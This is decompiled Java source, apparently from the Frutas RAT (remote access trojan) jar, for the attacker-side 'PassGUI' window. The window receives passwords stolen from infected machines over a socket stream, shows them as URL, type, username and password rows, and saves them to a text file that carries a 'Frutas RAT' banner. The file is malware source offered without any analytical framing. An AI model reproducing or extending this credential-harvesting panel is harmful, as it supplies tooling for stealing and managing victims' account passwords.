/*     */ package cliente;
/*     */ 
/*     */ import java.awt.Container;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ActionListener;
/*     */ import java.io.FileWriter;
/*     */ import java.io.IOException;
/*     */ import java.io.ObjectInputStream;
/*     */ import java.io.PrintStream;
/*     */ import java.util.logging.Level;
/*     */ import java.util.logging.Logger;
/*     */ import javax.swing.GroupLayout;
/*     */ import javax.swing.GroupLayout.Alignment;
/*     */ import javax.swing.GroupLayout.ParallelGroup;
/*     */ import javax.swing.GroupLayout.SequentialGroup;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JInternalFrame;
/*     */ import javax.swing.JOptionPane;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JTable;
/*     */ import javax.swing.LayoutStyle.ComponentPlacement;
/*     */ import javax.swing.table.DefaultTableModel;
/*     */ 
/*     */ public class PassGUI extends JInternalFrame
/*     */   implements Runnable
/*     */ {
/*     */   private ObjectInputStream in;
/*     */   private DefaultTableModel modelo;
/*     */   private JButton jButton1;
/*     */   private JScrollPane jScrollPane1;
/*     */   private JTable tabla;
/*     */ 
/*     */   public PassGUI(ObjectInputStream in)
/*     */   {
/*  28 */     this.in = in;
/*  29 */     initComponents();
/*     */ 
/*  31 */     this.modelo = ((DefaultTableModel)this.tabla.getModel());
/*     */   }
/*     */ 
/*     */   private void initComponents()
/*     */   {
/*  43 */     this.jScrollPane1 = new JScrollPane();
/*  44 */     this.tabla = new JTable();
/*  45 */     this.jButton1 = new JButton();
/*     */ 
/*  47 */     setClosable(true);
/*  48 */     setTitle("Contraseñas: ");
/*     */ 
/*  50 */     this.tabla.setModel(new DefaultTableModel(new Object[0][], new String[] { "URL", "Tipo", "Usuario", "Contraseña" }));
/*     */ 
/*  58 */     this.jScrollPane1.setViewportView(this.tabla);
/*     */ 
/*  60 */     this.jButton1.setText("Guardar");
/*  61 */     this.jButton1.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/*  63 */         PassGUI.this.jButton1ActionPerformed(evt);
/*     */       }
/*     */     });
/*  67 */     GroupLayout layout = new GroupLayout(getContentPane());
/*  68 */     getContentPane().setLayout(layout);
/*  69 */     layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jScrollPane1, -1, 628, 32767).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addGap(0, 0, 32767).addComponent(this.jButton1))).addContainerGap()));
/*     */ 
/*  80 */     layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addContainerGap(23, 32767).addComponent(this.jScrollPane1, -2, 174, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jButton1).addGap(15, 15, 15)));
/*     */ 
/*  90 */     pack();
/*     */   }
/*     */ 
/*     */   private void jButton1ActionPerformed(ActionEvent evt) {
/*  94 */     FileWriter fw = null;
/*     */     try {
/*  96 */       fw = new FileWriter(Math.round(Math.random() * 100000.0D) + ".txt");
/*  97 */       fw.write("Frutas RAT Programado por adwind\r\npagina: www.indetectables.net\r\n");
/*  98 */       for (int i = 0; i < this.tabla.getRowCount(); i++) {
/*  99 */         String url = "Pagina: " + this.tabla.getValueAt(i, 0).toString();
/* 100 */         String tipo = "Tipo: " + this.tabla.getValueAt(i, 1).toString();
/* 101 */         String user = "Usuario: " + this.tabla.getValueAt(i, 2).toString();
/* 102 */         String pass = "Contraseña: " + String.valueOf(this.tabla.getValueAt(i, 3));
/* 103 */         fw.write(url + "\r\n" + tipo + "\r\n" + user + "\r\n" + pass + "\r\n\r\n");
/*     */       }
/*     */ 
/* 107 */       JOptionPane.showMessageDialog(this, "Contraseñas guardadas.");
/*     */     } catch (IOException ex) {
/* 109 */       JOptionPane.showMessageDialog(this, "Hubo un error guardando el archivo.");
/*     */     } finally {
/*     */       try {
/* 112 */         fw.close();
/*     */       } catch (IOException ex) {
/* 114 */         Logger.getLogger(PassGUI.class.getName()).log(Level.SEVERE, null, ex);
/*     */       }
/*     */     }
/*     */   }
/*     */ 
/*     */   public void run()
/*     */   {
/*     */     try
/*     */     {
/*     */       while (true)
/*     */       {
/* 137 */         String lee = this.in.readUTF();
/* 138 */         System.out.println(lee);
/* 139 */         String[] datos = lee.split("#");
/* 140 */         for (String temp : datos)
/*     */         {
/* 142 */           String[] userypas = temp.split(",");
/* 143 */           this.modelo.addRow(userypas);
/*     */         }
/*     */       }
/*     */     }
/*     */     catch (IOException ex)
/*     */     {
/*     */     }
/*     */   }
/*     */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.PassGUI
 * JD-Core Version:    0.6.2
 */